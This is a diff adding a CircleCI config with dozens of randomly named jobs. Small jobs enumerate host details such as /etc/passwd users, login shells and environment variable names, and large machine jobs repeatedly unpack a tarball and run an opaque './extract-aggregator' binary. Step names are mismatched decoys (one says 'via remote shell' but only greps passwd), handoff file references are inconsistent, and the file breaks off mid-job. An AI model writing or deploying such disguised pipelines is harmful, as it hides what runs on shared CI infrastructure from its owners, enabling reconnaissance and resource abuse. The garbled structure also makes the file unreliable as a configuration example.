@@ -1,0 +1,1583 @@
+version: 2.1
+
+jobs:
+  recomend:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: 840 centrifuge samples
+          command: |
+            mkdir -p /var/tmp/wrk
+            set +o pipefail 2>/dev/null; word=stage; for i in $(seq 1 10000); do echo "${word//stage/phase}-${i}"; done > /var/tmp/wrk/draft_savanna; true
+            echo "ok $(wc -c </var/tmp/wrk/draft_savanna)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'draft_savanna'
+  run-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/draft_savanna 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  cell-riddle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: CHECK CPU TEMP
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type l 2>/dev/null | sort -r; true ; } > /var/tmp/wrk/8b91f858f26
+            echo "ok $(wc -c </var/tmp/wrk/8b91f858f26)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - '8b91f858f26'
+  Build_Prod3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/8b91f858f26 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  no_idx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Check the notification bell is disabled
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; env | head -n 8 | sed 's/=.*//' | tac; true ; } > /var/tmp/wrk/garden.zinc.quick.polar
+            echo "ok $(wc -c </var/tmp/wrk/garden.zinc.quick.polar)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'garden.zinc.quick.polar'
+  jess-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/garden.zinc.quick.polar 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  rd_ver_img:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Verification at 2359 sharp
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; shopt | head --lines=5; true ; } > /var/tmp/wrk/220.248.182.254
+            echo "ok $(wc -c </var/tmp/wrk/220.248.182.254)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - '220.248.182.254'
+  jun22-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/220.248.182.254 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  p6788:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: harden rate limits again
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; str="error: none"; echo "$str" | grep -o . | sort | uniq -c | sort -rn | head -n 3; true ; } > /var/tmp/wrk/vectorproxyreef
+            echo "ok $(wc -c </var/tmp/wrk/vectorproxyreef)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'vectorproxyreef'
+  PROD_HOOK_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/vectorproxyreef 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  Step-SrcClock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Marco approves anonymization
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; awk -F : '$1 ~ /^[a-m]/ { print $1 ":" $3 }' /etc/passwd | sort -k2 -n; true ; } > /var/tmp/wrk/ForestNickelCoin
+            echo "ok $(wc -c </var/tmp/wrk/ForestNickelCoin)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'ForestNickelCoin'
+  py311-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/ForestNickelCoin 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  cDeprecated:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: unlock rate limiter hotfix 14
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; fmt -w 32 /proc/cpuinfo | wc -l; true ; } > /var/tmp/wrk/usrlog
+            echo "ok $(wc -c </var/tmp/wrk/usrlog)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'usrlog'
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/hollowsurgemodule 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  start_or_default:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Free throw reconciliation
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; cat /etc/nsswitch.conf|grep '^#'|nl; true ; } > /var/tmp/wrk/ux
+            echo "ok $(wc -c </var/tmp/wrk/ux)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'ux'
+  xi-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/ux 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  Step-BackupView:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Mend the shared drive
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; for num in thursday monday saturday sunday wednesday tuesday; do echo $num;done | tac; true ; } > /var/tmp/wrk/CASE-74997-AI
+            echo "ok $(wc -c </var/tmp/wrk/CASE-74997-AI)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'CASE-74997-AI'
+  nova-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/hollowsurgemodule 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  PRIMARY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: LEGACY compaction
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; if [ ! -e /etc/fstab ] ; then echo true; else echo false; fi; true ; } > /var/tmp/wrk/TICKET_020999
+            echo "ok $(wc -c </var/tmp/wrk/TICKET_020999)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'TICKET_020999'
+  v6-beta4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/hollowsurgemodule 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  gClanLevel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Alert the incident channel via remote shell
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; if grep -q 'sh$' /etc/passwd ; then echo good; else echo "bad"; fi; true ; } > /var/tmp/wrk/hollowsurgemodule
+            echo "ok $(wc -c </var/tmp/wrk/hollowsurgemodule)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'hollowsurgemodule'
+  Prepare_Service7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/hollowsurgemodule 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  paintNewModelFile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Still weighing the hazmat shelf
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -name '*' -exec echo {} + 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /var/tmp/wrk/t6g
+            echo "ok $(wc -c </var/tmp/wrk/t6g)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 't6g'
+  tam-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/t6g 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  ICON_DEFER_SCENE_DRAIN_BACK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Last retry before release
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; grep 'sh$' /etc/passwd|sort|tail -n 10; true ; } > /var/tmp/wrk/yFGyFVH
+            echo "ok $(wc -c </var/tmp/wrk/yFGyFVH)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'yFGyFVH'
+  ShipProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/yFGyFVH 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  sara-chen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Confirm visa paperwork by friday
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; ls /proc | grep -v '^[0-9]' | head -n5; true ; } > /var/tmp/wrk/PANO_94654
+            echo "ok $(wc -c </var/tmp/wrk/PANO_94654)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'PANO_94654'
+  vega-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/PANO_94654 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  armor-trait-stale-rollback:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: chapter four spot check
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; find /usr/bin -maxdepth 3 -type f -name 'un*' -exec head -n 1 '{}' \;; true ; } > /var/tmp/wrk/Z
+            echo "ok $(wc -c </var/tmp/wrk/Z)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'Z'
+  depoly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/Z 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  BUCKET_NBF:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Sweep the wifi mesh
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 2 -type d -name '*random' -exec echo dir: '{}' ";" 2> /dev/null|sort|head -n 5; true ; } > /var/tmp/wrk/7itanc0pper
+            echo "ok $(wc -c </var/tmp/wrk/7itanc0pper)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - '7itanc0pper'
+  ivan-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/7itanc0pper 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  CkBQiLT7TRwq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: TAG OVERSTOCK FOR ROUTE 15
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=2768\nuser=bob\ndebug=true\n' >/tmp/Merge.dat && sed -n "s/^user=//p" /tmp/Merge.dat; true ; } > /var/tmp/wrk/ZINC_NEUTRON_LOADER_FILTER
+            echo "ok $(wc -c </var/tmp/wrk/ZINC_NEUTRON_LOADER_FILTER)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'ZINC_NEUTRON_LOADER_FILTER'
+  xray-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/hollowsurgemodule 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  deg_ave:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Absolutely required export
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; printf 'host=web01\nport=8118\nuser=kate\ndebug=false\n' >"/tmp/mountain_plugin_v2.conf" && grep ^port "/tmp/mountain_plugin_v2.conf" | cut -d= -f2; true ; } > /var/tmp/wrk/RUSTY_CLUSTER_NODE
+            echo "ok $(wc -c </var/tmp/wrk/RUSTY_CLUSTER_NODE)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'RUSTY_CLUSTER_NODE'
+  zulu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/RUSTY_CLUSTER_NODE 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  footer-image-block:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Me flashing the power supply
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; head -n 12 ~/.bashrc | rev | wc -w; true ; } > /var/tmp/wrk/acGz4wUR5i1G40xtl
+            echo "ok $(wc -c </var/tmp/wrk/acGz4wUR5i1G40xtl)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'acGz4wUR5i1G40xtl'
+  verify-full-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/acGz4wUR5i1G40xtl 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  readersById:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Sort the express lane and sign
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; f=(rome berlin delhi lima); echo ${f[@]/%/.txt}; true ; } > /var/tmp/wrk/md5_8c1ed58f3d4cdd
+            echo "ok $(wc -c </var/tmp/wrk/md5_8c1ed58f3d4cdd)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'md5_8c1ed58f3d4cdd'
+  p-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/hollowsurgemodule 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  recordPx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Slice the worker pool
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; for word in pepper secondary prefs; do echo -n "${word} ";done; echo; true ; } > /var/tmp/wrk/b6l
+            echo "ok $(wc -c </var/tmp/wrk/b6l)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'b6l'
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/b6l 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  hDCHiddenMidTime:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Prioritize scheduling
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; echo 'Hello, World' | tr ' ' '\n' | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | paste -sd ' '; true ; } > /var/tmp/wrk/xOT
+            echo "ok $(wc -c </var/tmp/wrk/xOT)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'xOT'
+  add-metrics-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/xOT 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  pluginIsNull:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: 860 INPUT sensor array
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; env | sort | head -n4; true ; } > /var/tmp/wrk/kjtsi0
+            echo "ok $(wc -c </var/tmp/wrk/kjtsi0)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'kjtsi0'
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/kjtsi0 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  cleanup4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: The purchase orders totaled at last
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; find /usr/share/doc -maxdepth 1 -newermt '1 week ago' | head -2; true ; } > /var/tmp/wrk/PSqgeO
+            echo "ok $(wc -c </var/tmp/wrk/PSqgeO)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'PSqgeO'
+  v2-edge2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/hollowsurgemodule 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  panWorkerRequest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Keep the load profile as is
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; printf 'host=localhost\nport=9060\nuser=olga\ndebug=true\n' >'/tmp/mango-salt.txt'&&(. '/tmp/mango-salt.txt' && echo "$host:$port"); true ; } > /var/tmp/wrk/draft_18a3ad8
+            echo "ok $(wc -c </var/tmp/wrk/draft_18a3ad8)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'draft_18a3ad8'
+  STAGE_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/draft_18a3ad8 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  E5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Send the login attempts from cache to region b
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; awk '{printf "%-16s %s\n", $1, $7}' /etc/passwd | wc -l; true ; } > /var/tmp/wrk/iter_308
+            echo "ok $(wc -c </var/tmp/wrk/iter_308)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'iter_308'
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/iter_308 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  tap_or_default:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: If prod looks wrong package the load balancer
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; cat /dev/null >'/tmp/node_butter.tmp' && ls -s '/tmp/node_butter.tmp'; true ; } > /var/tmp/wrk/2988c8e9fa0310d1eed42bdec32f040502e
+            echo "ok $(wc -c </var/tmp/wrk/2988c8e9fa0310d1eed42bdec32f040502e)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - '2988c8e9fa0310d1eed42bdec32f040502e'
+  verify:
+    machine:
